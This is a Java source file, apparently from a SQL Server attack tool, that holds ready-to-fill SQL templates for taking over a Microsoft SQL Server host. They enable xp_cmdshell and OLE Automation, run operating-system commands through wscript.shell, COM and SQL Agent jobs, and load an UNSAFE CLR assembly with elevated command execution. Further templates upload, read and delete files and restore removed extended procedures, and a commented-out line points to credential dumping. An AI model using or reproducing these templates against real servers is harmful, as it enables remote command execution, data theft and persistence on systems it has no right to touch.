package Util;


/**
 * @author ch1ng
 * @date 2022/4/11
 */
public class MssqlSqlUtil {
    public static String checkSql = "select '%s'";
    public static String activationXPCMDSql = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC " +
            "sp_configure 'xp_cmdshell', 1;RECONFIGURE;";
    public static String activationOAPSql = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'show advanced options', 0;";
    public static String XPCMDSql = "exec master..xp_cmdshell N'%s'";
    public static String getPathSql = "declare @path varchar(8000);\n" +
            "select @path=rtrim(reverse(filename)) from master..sysfiles where name='master';\n" +
            "select @path=reverse(substring(@path,charindex('\\',@path),8000));\n" +
            "select @path;";

    public static String getPathSqlHttp ="select reverse(substring(rtrim(reverse(filename)),charindex('\\',rtrim" +
            "(reverse(filename))),8000)) from master..sysfiles where name='master';";
    public static String runcmdOAPBULKSql = "declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c %s > %s'";
    public static String deleteOashellResultSql = "if OBJECT_ID(N'oashellresult',N'U') is not null\n" +
            "\tDROP TABLE oashellresult;";
    public static String getResFromTableSql ="create table oashellresult(res varchar(8000));WAITFOR DELAY '0:0:%s';bulk insert oashellresult from '%s';";
    public static String getOaShellResultSql = "SELECT * FROM oashellresult;";
    public static String runcmdOAPCOMSql = "declare @luan int,@exec int,@text int,@str varchar(8000);\n" +
            "exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@luan output;\n" +
            "exec sp_oamethod @luan,'exec',@exec output,'C:\\Windows\\System32\\cmd.exe /c %s';\n" +
            "exec sp_oamethod @exec, 'StdOut', @text out;\n" +
            "exec sp_oamethod @text, 'readall', @str out\n" +
            "select @str;";
    public static String runcmdAgentSql = "IF OBJECT_ID(N'{jobname}') is not null\n" +
            "\tEXEC sp_delete_job @job_name = N'{jobname}';\n" +
            "USE msdb;\n" +
            "EXEC dbo.sp_add_job @job_name = N'{jobname}';\n" +
            "EXEC sp_add_jobstep @job_name = N'{jobname}', @step_name = N'{jobname}', @subsystem = N'CMDEXEC', @command = N'%s', @retry_attempts = 1, @retry_interval = 5;\n" +
            "EXEC dbo.sp_add_jobserver @job_name = N'{jobname}';\n" +
            "EXEC dbo.sp_start_job N'{jobname}';";
    public static String versionSql = "select @@version";
    public static String isAdminSql = "select is_srvrolemember('sysadmin') as res;";
    public static String closeXPCMDSql = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;";
    public static String closeOapSql = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 0;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'show advanced options', 0;";
    public static String closeCLRSql = "if (exists (select * from dbo.sysobjects where name = 'kitmain'))drop proc kitmain;\n" +
            "if (exists (select * from sys.assemblies where name='MDATKit'))drop assembly MDATKit;\n";
    public static String activationCLRSql = "exec sp_configure 'show advanced options','1';reconfigure;exec sp_configure 'clr enabled','1';reconfigure;exec sp_configure 'show advanced options','1';";
    public static String setTrustworthySql = "alter database %s set trustworthy %s";
    public static String CreateAssemblySql = "CREATE ASSEMBLY [MDATKit]\n" +
            "AUTHORIZATION [dbo]\n" +
            "FROM 0x%s\n" +
            "WITH PERMISSION_SET = UNSAFE;\n";
    public static String checkCLRSql = "if (exists (select * from dbo.sysobjects where name = 'kitmain')) select '1' as res;";
    public static String createCLRFSql = "CREATE PROCEDURE [dbo].[kitmain]\n" +
            "@method NVARCHAR (MAX) , @arguments NVARCHAR (MAX) \n" +
            "AS EXTERNAL NAME [MDATKit].[StoredProcedures].[kitmain]";
    public static String cmdSql = "exec kitmain 'cmdexec',N'%s'";
    public static String superCmdSql = "exec kitmain 'supercmdexec',N'%s'";
    //public static String getSystemPasswordSql = "exec kitmain 'wdigest',N''";
    public static String normalUploadSql = "DECLARE @Obj INT;\n" +
            "EXEC sp_OACreate 'ADODB.Stream' ,@Obj OUTPUT;\n" +
            "EXEC sp_OASetProperty @Obj ,'Type',1;\n" +
            "EXEC sp_OAMethod @Obj,'Open';\n" +
            "EXEC sp_OAMethod @Obj,'Write', NULL, %s;\n" +
            "EXEC sp_OAMethod @Obj,'SaveToFile', NULL, N'%s', 2;\n" +
            "EXEC sp_OAMethod @Obj,'Close';\n" +
            "EXEC sp_OADestroy @Obj;";
    public static String getDiskSql = "EXEC xp_fixeddrives";
    public static String getFilesSql = "if OBJECT_ID(N'DirectoryTree',N'U') is not null\n" +
            "    DROP TABLE DirectoryTree;\n" +
            "CREATE TABLE DirectoryTree (subdirectory varchar(8000),depth int,isfile bit);\n" +
            "INSERT DirectoryTree (subdirectory,depth,isfile) EXEC master.dbo.xp_dirtree N'%s',1,1;";
    public static String getFilesResSql = "SELECT * FROM DirectoryTree";
    public static String normalDownloadSql = "declare @o int, @f int, @t int, @ret int\n" +
            "declare @line varchar(8000),@alllines varchar(8000)\n" +
            "set @alllines =''\n" +
            "exec sp_oacreate 'scripting.filesystemobject', @o out\n" +
            "exec sp_oamethod @o, 'opentextfile', @f out, N'%s', 1\n" +
            "exec @ret = sp_oamethod @f, 'readline', @line out\n" +
            "while (@ret = 0)\n" +
            "begin\n" +
            "set @alllines += @line + '\n" +
            "'\n" +
            "exec @ret = sp_oamethod @f, 'readline', @line out\n" +
            "end\n" +
            "select @alllines as lines";
    public static String normalHttpDownloadSql1 = "declare @o int, @f int, @t int, @ret int\n" +
            "declare @line varchar(8000),@alllines varchar(8000)\n" +
            "set @alllines =''\n" +
            "exec sp_oacreate 'scripting.filesystemobject', @o out\n" +
            "exec sp_oamethod @o, 'opentextfile', @f out, N'%s', 1\n" +
            "exec @ret = sp_oamethod @f, 'readline', @line out\n" +
            "while (@ret = 0)\n" +
            "begin\n" +
            "set @alllines += @line + '\n" +
            "'\n" +
            "exec @ret = sp_oamethod @f, 'readline', @line out\n" +
            "end\n" +
            "if OBJECT_ID(N'TempFile',N'U') is not null\n" +
            "    DROP TABLE TempFile;\n" +
            "CREATE TABLE TempFile (s varchar(8000));\n" +
            "INSERT TempFile (s) values (@alllines);";
    public static String normalHttpDownloadSql2 = "select s as line from TempFile";
    public static String normaldeleteSql = "DECLARE @Filehandle int\n" +
            "EXEC sp_OACreate 'Scripting.FileSystemObject', @Filehandle OUTPUT\n" +
            "EXEC sp_OAMethod @Filehandle, 'DeleteFile', NULL, N'%s'\n" +
            "EXEC sp_OADestroy @Filehandle";
    public static String normalmkdirSql = "exec master.sys.xp_create_subdir N'%s'";
    public static String clrmkdirSql = "exec kitmain 'newdir',N'%s'";
    public static String clrdeleteSql = "exec kitmain 'delete',N'%s'";
    public static String clruploadSql = "exec kitmain 'writefile',N'%s^%s'";
    public static String recoveryAllSql = "EXEC sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'\n" +
            "EXEC sp_addextendedproc xp_enumgroups ,@dllname ='xplog70.dll'\n" +
            "EXEC sp_addextendedproc xp_loginconfig ,@dllname ='xplog70.dll'\n" +
            "EXEC sp_addextendedproc xp_enumerrorlogs ,@dllname ='xpstar.dll'\n" +
            "EXEC sp_addextendedproc xp_getfiledetails ,@dllname ='xpstar.dll'\n" +
            "EXEC sp_addextendedproc Sp_OACreate ,@dllname ='odsole70.dll'\n" +
            "EXEC sp_addextendedproc Sp_OADestroy ,@dllname ='odsole70.dll'\n" +
            "EXEC sp_addextendedproc Sp_OAGetErrorInfo ,@dllname ='odsole70.dll'\n" +
            "EXEC sp_addextendedproc Sp_OAGetProperty ,@dllname ='odsole70.dll'\n" +
            "EXEC sp_addextendedproc Sp_OAMethod ,@dllname ='odsole70.dll'\n" +
            "EXEC sp_addextendedproc Sp_OASetProperty ,@dllname ='odsole70.dll'\n" +
            "EXEC sp_addextendedproc Sp_OAStop ,@dllname ='odsole70.dll'\n" +
            "EXEC sp_addextendedproc xp_regaddmultistring ,@dllname ='xpstar.dll'\n" +
            "EXEC sp_addextendedproc xp_regdeletekey ,@dllname ='xpstar.dll'\n" +
            "EXEC sp_addextendedproc xp_regdeletevalue ,@dllname ='xpstar.dll'\n" +
            "EXEC sp_addextendedproc xp_regenumvalues ,@dllname ='xpstar.dll'\n" +
            "EXEC sp_addextendedproc xp_regremovemultistring ,@dllname ='xpstar.dll'\n" +
            "EXEC sp_addextendedproc xp_regwrite ,@dllname ='xpstar.dll'\n" +
            "EXEC sp_addextendedproc xp_dirtree ,@dllname ='xpstar.dll'\n" +
            "EXEC sp_addextendedproc xp_regread ,@dllname ='xpstar.dll'\n" +
            "EXEC sp_addextendedproc xp_fixeddrives ,@dllname ='xpstar.dll'";

}
